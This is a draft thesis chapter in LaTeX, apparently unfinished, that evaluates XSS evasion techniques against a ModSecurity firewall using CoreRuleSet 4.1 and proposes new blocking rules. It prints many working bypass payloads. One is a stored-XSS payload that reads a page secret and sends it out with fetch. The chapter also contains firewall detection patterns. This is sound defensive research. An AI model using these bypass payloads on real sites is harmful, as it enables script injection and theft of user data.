<fileDetails>[line "748"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

after using string concatenation to craft an obscured variant of the example payload:

\begin{lstlisting}[style=basicStyle, language=Python]
'alert' + '(`concatenation`)'
\end{lstlisting}

the payload successfully evaded the firewall rule and reached the tested Web server. As mentioned under Section~\ref{sec:stringconc}, this technique is more effective when combined with forced evaluation. Evalutation results of combining this technique with using the function constructor to force the evaluation of the payload are stated under Section~\ref{sec:funconstrconbypass} and Section~\ref{sec:charcodemultiiter}.



\subsubsection{Function Constructor}
\label{sec:functionconstructorsingleeva}


{\color{red}TODO also: mention global objects here \cite{js/builtin}}

\subsubsection{Tagged Template Literals}
\label{sec:taggedtemplateliteralsevaluation}
As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall.
After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert`XSS` bypass, label=lst:alertXSSbypass]
<payload>alert("XSS")</payload>
<bypass>alert`XSS`</bypass>
\end{lstlisting}

{\color{red} hier evtl noch etwas mehr...}

\subsubsection{eval() function}
The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.
{\color{red} hier evtl noch etwas mehr...}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=eval(`al` + `e` + `rt('XSS')`) blocking example, label={lst:evalalertXSSblocked}]
<payload>eval(`al` + `e` + `rt('XSS')`)</payload>
<file>"rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "331"] [id "933160"]<fileDetails>
<MatchedData>"eval(`al`   `e`   `rt('XSS')"</MatchedData>

<file>"rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"eval("</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}

\subsubsection{JSFuck}
The payload \verb|alert('XSS')| has been sent to the Web Application and blocked (Listing~\ref{lst:alertXSSblocked}). Subsequently the payload was obscured using the service provided by JSFuck: https://jsfuck.com/ \\
The resulting payload is shown in Listing~\ref{lst:alertxssjsfuck}. The ModSecurity firewall using CRS 4.1 detects the JSFuck "encoding" and blocks the payload:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS') in JSFuck blocked, label={lst:alertxssjsfuckblocked}]
<payload>^(Listing~\ref{lst:alertxssjsfuck})^</payload>
<message>"JSFuck / Hieroglyphy obfuscation detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "654"] [id "941360"]<fileDetails>
<MatchedData>
"Suspicious payload found within ARGS_NAMES:[][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]][([][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]] [])[ (11337 characters omitted)"
</MatchedData>
<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}


\subsubsection{Aurebesh.js}
\label{sec:aurebeshevaluation}
When sending the payload \verb|prompt()|, the ModSecurity firewall using CRS 4.1 detects the \gls{xss} attempt and blocks the request:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=prompt(1\,2) blocked, label=lst:promptblocked]
<payload>prompt(1,2)</payload>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}
If the Aurebesh technique is used to substitute most of the payload with the characters \verb|A-I| as well as \verb|() + [] ! ' = {}|, the obscured payload bypasses the firewall:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=Aurebesh prompt bypass, label=lst:aurebeshpromptbypass]
<payload>prompt(1,2)</payload>
<bypass>A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')()</bypass>
\end{lstlisting}

For an explanation on how the payload mentioned in Listing~\ref{lst:aurebeshpromptbypass} was created, see Section~\ref{sec:aurebesh}.

The aurebesh evaluation concludes the single iteration evaluation. In the following subsection, payloads obscured through multiple iterations will be evaluated against the tested firewall configuration of an nginx reverse proxy using ModSecurity equipped with rules from the CoreRuleSet version 4.1.



	\subsection{Multi Iteration Evaluation}
\label{sec:multiiteration}
This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable bypass was found, the result will be detailed and used to derive additional firewall rules as shown under Section~\ref{sec:rulesproposal}.


\subsubsection{Percent encoding + Unicode in JSON}
The ModSecurity firewall blocks requests containing unicode escaped characters in JSON. (see Section~\ref{sec:unicodeinjsontest})
In order to evade this rule, a payload containing a unicode escaped character was percent-encoded previous to submission.
The ModSecurity firewall detected the unicode escape regardless and rejects the request:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json with additional percent encoding, label={lst:jsonunicodeurlenctest}]
<payload>urllib.parse.quote('{ "body": "alert\\u0024{1}" }')</payload>
<payload>%7B%20%22body%22%3A%20%22alert%5Cu0024%7B1%7D%22%20%7D</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}


\subsubsection{Double Percent encoding}
\label{sec:doublepercenc}
The payload from Listing~\ref{lst:urlencodedexampleblocked} was blocked by the ModSecurity firewall.
On usage of double Percent encoding , the rules with ids \verb|932130, 941390| no longer triggered and the payload bypasses the WAF:

\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doublepercentencoding}, escapeinside=\^\^, language=Python]
import urllib
urllib.parse.quote(urllib.parse.quote('alert(`${new Date()}`)'))
returns
alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529
\end{lstlisting}

However, this payload would not be valid unless the target also performs multiple step url decoding. Multiple step url decoding is forbidden according to RFC3986 "Uniform Resource Identifier (URI): Generic Syntax" - Section 2.4:
\begin{quote}
	Implementations must not
	percent-encode or decode the same string more than once, as decoding
	an already decoded string might lead to misinterpreting a percent
	data octet as the beginning of a percent-encoding, or vice versa in
	the case of percent-encoding an already percent-encoded string.
\end{quote}

\subsubsection{Double HTML character reference}
\label{sec:doublehtmlcharref}
As stated under Section~\ref{sec:htmlcharrefsingleeva}, three blacklisting rules caused the ModSecurity firewall using CRS4.1 to block the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
<a href=javascript:alert('a')>ClickMeFor$</a>
\end{lstlisting}

After obscuring the payload with a single iteration of HTML character reference substitution, the modified payload:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
\end{lstlisting}

successfully bypassed two of the three rules that caused the firewall to block the request.

On escaping the left parenthesis: \verb|(| in the javascript function \verb|alert()|, which was part of the matched data that caused rule with id \verb|941390| to match (see Listing~\ref{lst:storedxssinjblocked}), the payload becomes:

\begin{lstlisting}[style=basicStyle, language=Python, caption=HTML character reference bypass, label={lst:htmlcharacterreferencebypass}, escapeinside=\^\^]
<a href=jav^\&\#x61;script:alert\&\#x28;^'a')>ClickMeFor$</a>
\end{lstlisting}

and successfully bypasses the ModSecurity firewall using CRS4.1.


\subsubsection{HTML encoding + JavaScript normal character escape}
\label{sec:htmlencjsesc}
The following payload could be used by an attacker intending to employ stored XSS to exfiltrate secrets \cite{swigger/storedxss}.
It was blocked by the ModSecurity firewall based on 4 rule triggers:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
<payload><a href=javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a></payload>

<message>"Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "88"] [id "934110"]<fileDetails>
<MatchedData>"http://localhost"</MatchedData>

<message>"NoScript XSS InjectionChecker: Attribute Injection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "225"] [id "941170"]<fileDetails>
<MatchedData>"javascript:[...]"</MatchedData>

<message>"Node-Validator Deny List Keywords"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "252"] [id "941180"]<fileDetails>
<MatchedData>".innerhtml"</MatchedData>

<message>"IE XSS Filters - Attack Detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "323"] [id "941210"]<fileDetails>
<MatchedData>"javascript:v"</MatchedData>
\end{lstlisting}

As the payload is meant to be injected into an html document, HTML escaping can be used to escape certain characters.
On escaping of the character \verb|a| in \verb|j&#97vascript|, the payload evaded the rules with ids \verb|941170| and \verb|941210|.
On escaping the \verb|.| in \\ \verb|getElementsByName('name')[0]&#46innerHTML|, the payload evaded rule \verb|941180|.
Finally one of the \verb|/| in the url-string given to the JavaScript function \verb|fetch| is escaped by prepending it with a \verb|\|.
Escaping any normal character with a \verb|\| is allowed in JavaScript (Section~\ref{sec:jsescape}) and successfully made the payload evade the last remaining rule: \verb|934110|.
The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=stored xss bypass payload]
<a href=j&#97vascript:var secret = document.getElementsByName('name')[0]&#46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a>
\end{lstlisting}

\subsubsection{Function constructor + String concatenation + From charcode}
\label{sec:charcodemultiiter}
Following up on the idea to split the character sequence \verb|String.fromCharCode| into multiple segments, which was stated during the single iteration evaluation under Section~\ref{sec:charcodesingleiter}, the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
String.fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)
\end{lstlisting}

was split into two parts using the function constructor and string concatenation:

\begin{lstlisting}[style=basicStyle, language=Python]
[].map.constructor('String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)')();
\end{lstlisting}

This payload successfully bypasses the ModSecurity firewall configured to use the CRS4.1. In order to make this payload execute by itself, another use of the function constructor and string concatenation was applied:

\begin{lstlisting}[style=basicStyle, language=Python]
[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')();
\end{lstlisting}

On evaluating this payload against the tested firewall, the newly applied obscurity triggered a different filtering rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
<payload>
[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')();
</payload>

<message>"PHP Injection Attack: Variable Function Call Found"</message>
<file>"/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "488"] [id "933210"]<fileDetails>
<MatchedData>"('[].map.constructor(''String.''fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'')();')();"</MatchedData>
\end{lstlisting}

The regex used in this rule:

\begin{lstlisting}[style=basicStyle]
(?:\((?:.+\)(?:[\"'][\-0-9A-Z_a-z]+[\"'])?\(.+|[^\)]*string[^\)]*\)[\s\x0b\"'\-\.0-9A-\[\]_a-\{\}]+\([^\)]*)|(?:\[[0-9]+\]|\{[0-9]+\}|\$[^\(\),\.\/;\x5c]+|[\"'][\-0-9A-Z\x5c_a-z]+[\"'])\(.+)\);
\end{lstlisting}

requires a semicolon to finish the statement. In JavaScript, cases exist, where this semicolon is not neccessary. One such case would be the existance of a semicolon finished statement in the code just before where the payload is injected and a newline followed by another function call or variable assignment in the code after where the payload is injected. A case where the semicolon would be neccessary to achieve code execution is the following:

\begin{lstlisting}[style=basicStyle, language=Python]
<statements before>

[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')()

[].constructor.constructor('alert("exception")')()

<statements after>
\end{lstlisting}

JavaScript is able to automatically insert some semicolons to create valid syntax from statements where the semicolons have been omitted. JavaScript's automatic semicolon insertion rules are stated under \cite{js/autosemi}.


\subsubsection{Eval + JavaScript character escape}
\label{sec:jsescapemultiiter}
As shown in Section~\ref{sec:jsescapesingleiter}, JavaScript's unicode code point escape sequence can be used to escape identifiers.
Characters in String literals can also be replaced by escape sequences in JavaScript. Considering the bypass in Listing~\ref{lst:strconcbypass} mentioned under Section~\ref{sec:stringconcsingleiter}, the bypassing payload containing a string literal:

\begin{lstlisting}[style=basicStyle, language=Python]
'alert' + '(`concatenation`)'
\end{lstlisting}

with the intention of bypassing the regex filter matching on \verb|alert(| can be improved. The payload needs to be evaluated twice on the target in order to achieve the desired effect. The first evaluation concatenates the string composing the desired JavaScript statements, the second evaluation achieved the desired effect through evaluating JavaScript statements contained in the just concatenated string. 

The first way to substitute the evaluation, that concatenates the payload string, is by a payload obscured using JavaScrip escape sequences instead of string concatenation:

\begin{lstlisting}[style=basicStyle, language=Python, caption='alert\textbackslash u\{0028\}`escaped`) bypass]
'alert\u{0028}`escaped`)'
\end{lstlisting}

Through substituting the opening parenthesis \verb|(|, the firewall does not match on the character sequence \verb|alert(| and the string concatenation can be omitted.

The second way to substitute the evaluation, that concatenates the payload string, is by a payload using \verb|eval()| that has been obscured through JavaScript escape sequences that enforces this evaluation:

\begin{lstlisting}[style=basicStyle, language=Python, caption='ev\textbackslash u\{0061\}l('alert' + '(`escaped`)') bypass]
ev\u{0061}l('alert' + '(`escaped`)')
\end{lstlisting}

Through substituting a part of the \verb|eval()| function, matches on \verb|eval(|, that are seen in Listing~\ref{lst:evalalertXSSblocked} under Section~\ref{sec:evalsingleiter}, are avoided. A similar result to the bypass listed in Listing~\ref{lst:funconbypass} under Section~\ref{sec:functionconstructorsingleeva} has been achieved.



\subsubsection{Function constructor + String concatenation}
\label{sec:funconstrconbypass}
In this test, the payload logic should include multiple statements and reveal a secret by accessing a property.
The basic implementation was blocked by the ModSecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor blocked, label={lst:funconblocked}]
<payload>new Function('var s = "secret";prompt("something", s)')()</payload>

<message>"Node.js Injection Attack 1/2"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"new Function("</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}

To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted with \verb|[]['constructor']['constructor']()|. Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using square bracket notation]
[]['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()
\end{lstlisting}

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using dot notation]
[].constructor.constructor('var s = "secret";promp' + 't("something", s)')()
\end{lstlisting}

\subsubsection{Avoiding ()}
\label{sec:avoidingbypassA}
In the context of testing firewall evasion techniques, the author faced the question if it was possible to create payloads without  \verb|()|. Those payloads still need to be valid and bypass the waf.
Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and closing \verb|()| can be substituted with Tagged Template Literals. This caused another firewall rule to trigger:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () blocked, label={lst:avoiding () blocked}]
<payload>[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something${s}`'}```</payload>

<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${s}`}"</MatchedData>
\end{lstlisting}

Evading rule \verb|932130| was possible by using a form of unicode escaping in JavaScript that was introduced with ES6 and differs from the unicode escaping in JSON. The character sequence \verb|${s}| was replaced with \verb|\u{0024}{s}|. This made the payload bypass the ModSecurity firewall. The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using square bracket notation]
[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
\end{lstlisting}

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using dot notation]
[].constructor.constructor`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
\end{lstlisting}

It is conspicuous that the payload could bypass the firewall with only the later \verb|$| of the two placeholders: \verb|${expression}| escaped.
This seems to be a bug in the WAF or the ruleset.
It is also what enables the above payload to be valid.
A substitution of the earlier \verb|$| with an escaped variant is not possible.
JavaScript does not recognize the placeholder in the Template Literal without the explicit character \verb|$|.
Substitution of the second placeholder is possible because it happens inside a string containing the Tagged Template Literal.

If the webserver is using unicode normalization (NFKC) to normalize incoming requests, the character \verb|$| can also be replaced with another character in unicode that gets normalized to it to create a valid bypassing payload. It was tested with the small dollar sign U+FE69. In this case it was neccessary to use Percent encoding in addition to avoid that the WAF flags the Unicode escape sequences as \quotes{Possible Unicode character bypass detected}:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using unicode normalization]
urllib.parse.quote("[]['constructor']['constructor']`a\uFE69{'var s = \"secret\";promp' + 't`something\uFE69{s}`'}```")
returns
%5B%5D%5B%27constructor%27%5D%5B%27constructor%27%5D%60a%EF%B9%A9%7B%27var%20s%20%3D%20%22secret%22%3Bpromp%27%20%2B%20%27t%60something%EF%B9%A9%7Bs%7D%60%27%7D%60%60%60
\end{lstlisting}
% console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))

\subsubsection{Avoiding \{\}}
\label{sec:avoidingbypassB}
A payload thats not using any \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string replace strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, the similar payload in Listing~\ref{lst:stringreplaceblocked} was being blocked by the modsecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} payload, label={lst:stringreplaceblocked}]
<payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${2 2}"</MatchedData>
\end{lstlisting}

On using a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of

\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using square bracket notation, label={lst:stringreplacepass}]
[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}

successfully evaded the firewall.

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using dot notation, label={lst:stringreplacepass}]
[].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}




\subsubsection{Forcing unicode normalization}
{\color{red} TODO: what happens if a string followed by .normalize('NFKC') is sent as payload?}

	\subsection{Interpretation of evaluation results}
Evaluation results show that there are multiple Firewall Evasion techniques effective against the tested firewall configuration. {\color{red}X of Y} tested Firewall Evasion techniques have proven effective during the evaluation. Using the techniques described in Section~\ref{sec:unicodenormalization}: Unicode Normalization, Section~\ref{sec:taggedtemplateliterals}: Tagged Template Literals, Section~\ref{sec:functionconstructor}: Function constructor in combination with Section~\ref{sec:sbn}, Section~\ref{sec:stringreplace} and Section~\ref{sec:aurebesh}, multiple payloads can be constructed to bypass the tested firewall configuration. Section~\ref{sec:multiiteration} states examples including passing malicious html elements (Section~\ref{sec:htmlencjsesc}) as well as directly executable JavaScript code (Section~\ref{sec:funconstrconbypass}. 
Further possible payloads include payloads that could be used to circumvent a more stringent ruleset.
Section~\ref{sec:avoidingbypassA} states a proof of concept of a valid payload that avoids passing the characters \verb|()| as part of the payload.
Similarly, Section~\ref{sec:avoidingbypassB} states a proof of concept of a valid payload that avoids passing the characters \verb|{}| as part of the payload. 

While the evaluation results state some possible evading payloads as is, it seems natural that there are more evading payloads possible using a combination of the stated techniques under Section~\ref{sec:firewallevasiontechniques}.

Using these results, the administrator of the tested firewall can implement new filtering rules. Depending on the implementation context of the firewall, such as the language used to configure the firewall rules, some limitations might apply. Using the ModSecurity firewall configured to use the CoreRuleSet as an example, the firewall rules can be extended following the guide provided in their documentation. By extending the ruleset, it is possible to blacklist the bypassing payloads. Created and proposed rules based on the evaluation results mentioned under Section~\ref{sec:singleiterationeva} and Section~\ref{sec:multiiteration} are detailed under Section~\ref{sec:rulesproposal}. Depending on the specific Web Application that is protected by the Web Application firewall, adding rules that completely block some Evasion Techniques that were detected to be effective might be possible. If that is not the case, it could be possible to blacklist payloads that were discovered during the evaluation. At least, some discovered bypassing payloads are known after the evaluation. With this knowledge, the Web Application can be fortified using a different methodology to adding firewall filtering rules. If nothing is to be done about the findings, still the knowledge gained about bypassing payloads can be used to estimate the risk posed to the Web Application. 

Gathered evaluation results can be used to gain knowledge about payload limitations that incur by applying Firewall Evasion techniques to a payload. (Using this knowledge, more defensive measures based on exploiting the incurred payload limitations can theoretically be deployed to render a specific evasion technique useless.)
Incurring payload limitations will be discussed in the following section.



... 

	\subsection{Payload limitations}
\label{sec:payloadlimitations}
During the evaluation of the tested web application firewall using firewall evasion techniques, some payload limitations incurred through using certain evasion techniques became apparent. This section highlights some of them and states whether workarounds for those have been found. If a workaround for an incurred payload limitation exists, but is not known during the evaluation, a loophole in the evaluated firewall configuration might be missed.

On usage of Tagged Template Literals like stated under Section~\ref{sec:taggedtemplateliterals}, the function being called always is called with the first parameter being an array of string literals, the second parameter being the first placeholder expression and following parameters according to following placeholders. Therefore, a workaround must be found for functions whose first parameter is to be called with the result of an expression.
For instance, if the return value of an expression is to be displayed using the \verb|alert()| function, a substitute needs to found, as \verb|alert()| only accepts one parameter, which contains the message \verb|alert()| will display. \cite{js/alert} 
Therefore, using \verb|alert()| will limit the displaying possibilities to the first parameter (an array of strings) of a Tagged Template Literal call. Substituting \verb|alert()| with the function \verb|prompt()| in combination with Tagged Template Literals allows to display a parameter given to the template string. The function \verb|prompt()| allows two parameters whereas the second parameter is used for a default input text in the displayed prompt. \cite{js/prompt} 
As such, it is possible to display the result of the expression given in the first placeholder {\verb|{<expression>}|} after string coercion.
However, in some cases there might not be a substitute function available. In such a case, the usage of Tagged Template Literals might not be possible at the time of the evaluation.

If payloads make use of string concatenation, they need to be evaluated an additional time in order to concatenate the strings composing the statements that are be executed by the target. Therefore, either this evaluation must be forced by supplying according statements with the payload or this additional evaluation must be built-in the web application code that receives such payloads. An example of enforcing evaluation by supplying according statements is demonstrated under Section~\ref{sec:funconstrconbypass}. 
Therefore, if a given ruleset manages to block requests equipped with statements to enforce the evaluation, and the web application does not perform any additional evaluation, using string concatenation to bypass a web application firewall in this configuration might not be possible at the time of the evaluation.

If a payload makes use of percent encoding and the payloads are sent in the request body, the web application that receives this request must commit to percent decoding request bodies. As stated under Section~\ref{sec:percenc}, web servers receiving data via URI are inclined to percent decode this data before handing this data to the web application. This does not apply to request bodies. These must be explicitly percent decoded by the web application, if a web application is expecting data sent via request bodies to be percent encoded. As such, this technique is limited to being used when payload data is being sent via URI, via the request body towards a web application that explicitly decodes percent encoded bodies or partially percent encoded with force percent decoding similar to the forced unicode normalization stated under Section~\ref{sec:forcedunicodenorm}.

If payloads make use of the \verb|Function()| constructor, multiple limitations apply. The first limitation potentially restricts access to local identifiers. As stated under Section~\ref{sec:functionconstructor}, the \verb|Function()| constructor creates functions that execute in the global scope only. If trying to access local identifiers in statements given to the function constructor, these will cause errors or unexpected results. In the example code snippet:

\begin{lstlisting}[style=basicStyle, language=Python]
const value = 1
function testFunc() {
	const value = 2
	const func = () => { return 'func' }

	console.log(eval('1 + value'))
	console.log([].map.constructor('return 1 + value')())
	console.log(eval('func()'))
	console.log([].map.constructor('func()')())
}
testFunc()
\end{lstlisting}
The console will log the following four logs in order:

\begin{lstlisting}[style=basicStyle, language=Python]
3 
2 
func 
Uncaught ReferenceError: func is not defined
\end{lstlisting}
This is caused by the variable \verb|value| being initialized and accessed in global scope by the \verb|Function()| constructor with the value of 1, while a variable with the same identifier is being initialized and accessed by the \verb|eval()| function in the local scope. The same applies to the \verb|func()| function. There are two different functions in the global and local scope that go by lexically equal indentifiers.

The second limitation inherent to using the \verb|Function()| constructor comes with using the statements \verb|[]| or \verb|{}| creating empty objects to access said constructor. As mentioned under Section~\ref{sec:functionconstructor} and Section~\ref{sec:charcodemultiiter}, the validity of payloads that include statements like \verb|[].constructor.constructor| depends on the context where the statements of such a payload will be injected. 

% {}[].constructor.constructor('alert' + '(`concatenation`)')(): de
% depending on the context, where the payload will be inserted, sometimes the function constructor can not be used


	\subsection{Rules Proposal}
\label{sec:rulesproposal}
During the evaluation of the tested firewall configuration, some firewall evading payloads were found. For some of those bypasses, new rule configurations will be proposed. As mentioned before, adding new filtering rules always poses a risk that subsequently, benign requests might be flagged as malicious. As such, the possible implications of adding new firewall rules needs to be considered.

	{\color{red} TODO: explain modsecurity/coreruleset rule setup?}

\subsubsection{Function Constructor}
\label{sec:rulespropfunctionconstructor}
The bypassing payload from sections Section~\ref{sec:funconstrconbypass}: Function Constructor + String Concatenation, Section~\ref{sec:avoidingbypassA}: Avoiding () and Section~\ref{sec:avoidingbypassB}: Avoiding \{\} rely on accessing the function constructor by accessing functions on built-in objects.

To block requests using the function contructor (dot notation) as a method to evade the current evaluated firewall configuration, a new firewall rule (Listing~\ref{lst:constuctorsruleproposal}) is proposed:

\begin{lstlisting}[style=basicStyle, caption=rule proposal to block usage of function constructor via dot notation, label={lst:constructorsruleproposal}]
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@rx (?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))\.[a-z]*\.constructor[`,(,\[]" \
    "id:2,\
    phase:2,\
    auditlog,\
    capture,\
    t:none,t:urlDecodeUni,t:compressWhitespace,\
    msg:'XSS JavaScript function with constructor',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'attack-xss',\
    tag:'xss-perf-disable',\
    tag:'paranoia-level/1',\
    severity:'CRITICAL',\
    setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
\end{lstlisting}

The rule with \verb|id:2| shown in Listing~\ref{lst:constructorsruleproposal} aims at matching usage of the function constructor via dot notation using the following regular expression:

\begin{lstlisting}[style=basicStyle, caption=regex of proposed rule id:2, label={lst:constructorsruleproposalregexA}]
(?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))\.[a-z]*\.constructor[`,(,\[]

explanation:
(?i)  match the remainder of the pattern with the i modifier: Case insensitive match

(?:   start a non-capturing group (object group)

(?:   start a non-capturing group (square bracket group)
\[    match on a single opening square bracket
[     start a list
^\]   exclude the closing square bracket from matching
]     end the list
*     match the characters from the list (anything that is not a square closing bracket) between 0 and unlimited times
\]    match on a single closing square bracket
)     close the group (square bracket group)

|     give an alternative the previous group (square bracket group)

(?:	  start a non-capturing group (curly bracket group)
\{	  match on a single opening curly bracket
[     start a list
^}	  exclude the closing curly bracket
]     end the list
*     match the characters from the list (anything that is not a curly closing bracket) between 0 and unlimited times
\}	  match on a single closing curly bracket
)     close the group (curly bracket group)

)     close the group (object group)

\.    match on a single dot

[     start a list
a-z   match a single character between a (index 97) and z (index 122)
]     end the list
*     match the characters from the list (anything from a to z) between 0 and unlimited times

\.	  match on a single dot

constructor    match on the word "constructor"

[     start a list
`,(,\[         match on a single `, opening round bracket or opening square bracket
]     end the list
\end{lstlisting}

The two payload options of: \\
\verb|[].something.constructor()| and \verb|{}.something.constructor()| \\
are matched by this regular expression. Therefore, once the configuration is updated with the proposed rule, the bypassing payload using dot notation that has been discovered in Section~\ref{sec:funconstrconbypass} is being detected by the evaluated firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor bypass payload using dot notation blocked, label={lst:constructorsblockedpoc}]
